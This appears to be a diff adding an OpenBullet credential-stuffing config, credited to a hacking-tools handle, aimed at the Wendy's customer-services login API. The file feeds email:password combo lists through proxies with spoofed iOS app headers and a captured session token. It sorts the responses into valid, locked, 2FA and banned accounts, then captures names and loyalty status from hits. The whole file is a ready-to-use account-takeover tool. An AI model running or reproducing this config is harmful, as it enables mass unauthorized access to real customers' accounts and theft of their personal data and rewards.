@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "Wendy's(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-19T01:37:44.7856124+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://customerservices.wendys.com/CustomerServices/rest/login?lang=en&cntry=CA&sourceCode=MY_WENDYS&version=9.3.4" 
+  CONTENT "{\"password\":\"<PASS>\",\"keepSignedIn\":true,\"deviceId\":\"DFA8FBF9-7DB8-4F9B-8851-6AA670C7FE66\",\"login\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: customerservices.wendys.com" 
+  HEADER "Cookie: X-ProofOfWork-JWT=eyJ0eXAiOiJKV1QiLCJraWQiOjAsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJjb20ud2VuZHlzLnByb29mb2Z3b3JrIiwiaXNzIjoiY29tLndlbmR5cy5wcm9vZm9md29ya3NlcnZlciIsImV4cCI6MTY1MDIzMTY4NywiaWF0IjoxNjUwMjMwNzg3fQ.UbjKLq2YtR2904hCGnRovbUaCpc7tJkxovSxyixbWP_ZjpH0x53gL1zPsOO0_pjUACxBbOzhNJsDVcMEdpzC_sAURq02szCVShVXcy7H--9nv35vJ_FLkbhL2OoNlu0DG15VKr_giO5p10WK-oFF8Y7DTdkR24fe_dIichl15ni_HMMOPI016NrNyeQSOsNVL50aAL41eM1r8AJB7n3zoLqXG8uiNTkWqmnU-AWLHnmiKGpllMalsP5pec66i7b53u6ka1yrkcTr0TKsIrFq6QhviMuS2pfZ587FaPBoNWWN1P9H6QOhpAimG_X9evgbKiWK326npkNTs1U9zRnOuxfHeEaj_WWTxfepWyHMVQv2uKp5aJtKIAMXyik1zsARlyZ-o8d0Y0S8i5i9rqhq88ZF28cPbr0THsA5V-TfqkqR9Xwtlw83UrpGJWsrgyc7w4KfKMde0p2f5ImMbr52ClESwd_ugTkNRYRmemHCWVuflVdG-pzZ6IqpfzLTayIZhgLNgUWKPbpTwk-OTV0ZQDjwVfSOB9xpRWsm023CrVV5GFxIS0abXePk7ANE81eOuvW568LyPZjHNr0ew2R6FHZBM8QVpVPga51luYVUZ7FpltobRksjkaiHFuCsehGXha8G_m4GQ2gJrmMa1ym4ZvQQlq0o9ABDwG8Mx8igEQE; Domain=wendys.com; Path=/; HttpOnly" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Dynatrace: MT_3_9_166855896617580_1_045c4136-53fa-47e7-8e56-3e1dacfadd23_86_1_352" 
+  HEADER "User-Agent: Wendys/9.3.4 (iPhone; iOS 15.4.1; Scale/2.00)" 
+  HEADER "Accept-Language: en-CA;q=1" 
+  HEADER "Content-Length: 127" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "serviceStatus\":\"1" 
+    KEY "serviceStatus\":\"ERROR" 
+    KEY "An account could not be created" 
+    KEY "That didn't seem to work. If you're having trouble logging in" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "serviceStatus\":\"38" 
+    KEY "Your account was previously locked for your security" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "serviceStatus\":\"5" 
+    KEY "For full access to My Wendy'sâ„¢, we need you to first create a profile" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+#Token PARSE "<SOURCE>" JSON "token" -> VAR "TK" 
+
+PARSE "<SOURCE>" LR "\"data\":{\"accessJwt\":\"" "\"" -> VAR "JWT" 
+
+PARSE "<SOURCE>" JSON "identityJwt" -> VAR "identityJwt" 
+
+PARSE "<SOURCE>" JSON "firstName" -> VAR "firstName" 
+
+PARSE "<SOURCE>" JSON "lastName" CreateEmpty=FALSE -> CAP "Name" "<firstName> " "" 
+
+PARSE "<SOURCE>" JSON "hasLoyalty" CreateEmpty=FALSE -> CAP "hasLoyalty" 
+
+PARSE "<SOURCE>" JSON "hasLoyalty2020" CreateEmpty=FALSE -> CAP "hasLoyalty2020" 
+
+PARSE "<SOURCE>" JSON "hasLoyaltyCard" CreateEmpty=FALSE -> CAP "hasLoyaltyCard" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By " 
+
